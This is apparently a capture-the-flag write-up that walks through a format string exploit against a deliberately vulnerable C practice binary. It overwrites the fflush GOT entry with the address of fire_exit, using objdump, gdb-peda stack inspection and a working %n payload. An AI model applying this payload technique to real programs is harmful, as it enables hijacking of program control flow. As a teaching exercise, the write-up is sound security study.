Let's take a look at the source code...

```
#include <stdlib.h>
#include <stdio.h>

void fire_exit()
{
	printf("Oh look, a fire exit. That's why we are still under budget. Level Cleared \n");
}

void fun0()
{
	puts("Oh I almost forgot to mention, due to budget cuts we decided to get rud if tge exit. Just think of all of the security research we can do now!. And by we, I mean you.\n");
	char buf0[100];
	fgets(buf0, sizeof(buf0), stdin);
	printf(buf0);
	fflush(stdout);
}

int main()
{
	fun0();
}
```

So looking at this code, we see that the objective is to run the fire_exit function. However there isn't anywhere in the code that directly calls thay function. However after the insecure printf call, we can see a fflush() function call. We can craft a format string exploit to overwrite the address of the fflush variable with that of the fire_exit() function, thus when when the binary tries to run the fflush function it will just run the fire_exit() function. First thing we will need is the address of the fire_exit() function.

```
$	objdump -t f4_64 | grep fire_exit
00000000004006e6 g     F .text	0000000000000011              fire_exit
```

So we now have the address of the fire_exit() function, which is 0x4006e6. Now we need to find the address of the fflush function. Since fflush is in libc (which is a shared library), we can view it in the dynamic relocation with objdump (using the -R flag).

```
$	objdump -R f4_64 | grep fflush
0000000000601040 R_X86_64_JUMP_SLOT  fflush@GLIBC_2.2.5
```

Now let's figure out how to properly format the address so the exploit will work. In here we will have four characters before the address, and five zeros after the address that way it somewhat resembles the final exploit.

```
$	python -c 'print "%7$x" + "\x40\x10\x60\x00\x00\x00\x00"' > payload
```

and now onto gdb

```
gdb-peda$ disas fun0
Dump of assembler code for function fun0:
   0x00000000004006f7 <+0>:	push   rbp
   0x00000000004006f8 <+1>:	mov    rbp,rsp
   0x00000000004006fb <+4>:	sub    rsp,0x70
   0x00000000004006ff <+8>:	mov    rax,QWORD PTR fs:0x28
   0x0000000000400708 <+17>:	mov    QWORD PTR [rbp-0x8],rax
   0x000000000040070c <+21>:	xor    eax,eax
   0x000000000040070e <+23>:	mov    edi,0x400858
   0x0000000000400713 <+28>:	call   0x400580 <puts@plt>
   0x0000000000400718 <+33>:	mov    rdx,QWORD PTR [rip+0x200951]        # 0x601070 <stdin@@GLIBC_2.2.5>
   0x000000000040071f <+40>:	lea    rax,[rbp-0x70]
   0x0000000000400723 <+44>:	mov    esi,0x64
   0x0000000000400728 <+49>:	mov    rdi,rax
   0x000000000040072b <+52>:	call   0x4005c0 <fgets@plt>
   0x0000000000400730 <+57>:	lea    rax,[rbp-0x70]
   0x0000000000400734 <+61>:	mov    rdi,rax
   0x0000000000400737 <+64>:	mov    eax,0x0
   0x000000000040073c <+69>:	call   0x4005a0 <printf@plt>
   0x0000000000400741 <+74>:	mov    rax,QWORD PTR [rip+0x200918]        # 0x601060 <stdout@@GLIBC_2.2.5>
   0x0000000000400748 <+81>:	mov    rdi,rax
   0x000000000040074b <+84>:	call   0x4005d0 <fflush@plt>
   0x0000000000400750 <+89>:	nop
   0x0000000000400751 <+90>:	mov    rax,QWORD PTR [rbp-0x8]
   0x0000000000400755 <+94>:	xor    rax,QWORD PTR fs:0x28
   0x000000000040075e <+103>:	je     0x400765 <fun0+110>
   0x0000000000400760 <+105>:	call   0x400590 <__stack_chk_fail@plt>
   0x0000000000400765 <+110>:	leave  
   0x0000000000400766 <+111>:	ret    
End of assembler dump.
gdb-peda$ b *fun0+69
Breakpoint 1 at 0x40073c
gdb-peda$ r < payload
Starting program: /Hackery/escape/fmt_str/f4_64/f4_64 < payload
Oh I almost forgot to mention, due to budget cuts we decided to get rud if tge exit. Just think of all of the security research we can do now!. And by we, I mean you.


 [----------------------------------registers-----------------------------------]
RAX: 0x0 
RBX: 0x0 
RCX: 0xa00000000601040 
RDX: 0x7ffff7dd3790 --> 0x0 
RSI: 0x60242c --> 0x0 
RDI: 0x7fffffffddb0 --> 0x60104078243725 
RBP: 0x7fffffffde20 --> 0x7fffffffde30 --> 0x400780 (<__libc_csu_init>:	push   r15)
RSP: 0x7fffffffddb0 --> 0x60104078243725 
RIP: 0x40073c (<fun0+69>:	call   0x4005a0 <printf@plt>)
R8 : 0x60242c --> 0x0 
R9 : 0x0 
R10: 0x7ffff7fd3700 (0x00007ffff7fd3700)
R11: 0x246 
R12: 0x4005f0 (<_start>:	xor    ebp,ebp)
R13: 0x7fffffffdf10 --> 0x1 
R14: 0x0 
R15: 0x0
EFLAGS: 0x246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x400730 <fun0+57>:	lea    rax,[rbp-0x70]
   0x400734 <fun0+61>:	mov    rdi,rax
   0x400737 <fun0+64>:	mov    eax,0x0
=> 0x40073c <fun0+69>:	call   0x4005a0 <printf@plt>
   0x400741 <fun0+74>:	
    mov    rax,QWORD PTR [rip+0x200918]        # 0x601060 <stdout@@GLIBC_2.2.5>
   0x400748 <fun0+81>:	mov    rdi,rax
   0x40074b <fun0+84>:	call   0x4005d0 <fflush@plt>
   0x400750 <fun0+89>:	nop
Guessed arguments:
arg[0]: 0x7fffffffddb0 --> 0x60104078243725 
[------------------------------------stack-------------------------------------]
0000| 0x7fffffffddb0 --> 0x60104078243725 
0008| 0x7fffffffddb8 --> 0xa000000 ('')
0016| 0x7fffffffddc0 --> 0x0 
0024| 0x7fffffffddc8 --> 0x0 
0032| 0x7fffffffddd0 --> 0x0 
0040| 0x7fffffffddd8 --> 0x0 
0048| 0x7fffffffdde0 --> 0xff00000000000000 
0056| 0x7fffffffdde8 --> 0xff0000000000 
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value

Breakpoint 1, 0x000000000040073c in fun0 ()
gdb-peda$ x/x 0x7fffffffddb0
0x7fffffffddb0:	0x0060104078243725
```

So we can see that the address is not in it's own QWORD. We should be able to add four characters before the address should move it over to the next QWORD.

```
$	python -c 'print "%7$x0000" + "\x40\x10\x60\x00\x00\x00\x00\x00"' > payload
```

Now onto gdb using the same breakpoint...

```
[------------------------------------stack-------------------------------------]
0000| 0x7fffffffddb0 ("%7$x0000@\020`")
0008| 0x7fffffffddb8 --> 0x601040 --> 0x4005d6 (<fflush@plt+6>:	push   0x5)
0016| 0x7fffffffddc0 --> 0xa ('\n')
0024| 0x7fffffffddc8 --> 0x0 
0032| 0x7fffffffddd0 --> 0x0 
0040| 0x7fffffffddd8 --> 0x0 
0048| 0x7fffffffdde0 --> 0xff00000000000000 
0056| 0x7fffffffdde8 --> 0xff0000000000 
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value

Breakpoint 1, 0x000000000040073c in fun0 ()
gdb-peda$ x/x 0x7fffffffddb8
0x7fffffffddb8:	0x0000000000601040
```

Now it is in it's own QWORD, we can wite to it. Right now the write will be for zero bytes, since nothing is printed before the "%7$x" which symbolizes the flag which will be writing to the fflush function. What we can do to rewrite it to the fire_exit function is writing the amount of bytes equal to the hex string of the fire_exit function. Let's find out how many bytes we will need to write using python.

```
>>> 0x4006e6
4196070
```

So we will need to write 4196070 bytes in order to rewrite fflush to fire_exit. For this we will just have the format string print out that many bytes. That will add 9 characters, thus making the critical portion of our explooit 13 characters long (%4196070x%8$n). We need the length to be a multiple of 8, since QWORDS can hold 8 characters and if this portion overfills into the next QWORD it will mess up the address and the exploit won't work. We can fix this by just adding three characters to the end. This will move the address over onw QWORD (before it was at 7, now it's at 8). Let's test it!

```
$	python -c 'print "%4196070x%8$n000" + "\x40\x10\x60\x00\x00\x00\x00\x00"'| ./f4_64 
```

One wall of text later...

```
602439000@`Oh look, a fire exit. That's why we are still under budget. Level Cleared 
```

Just like that, we pwned the binary!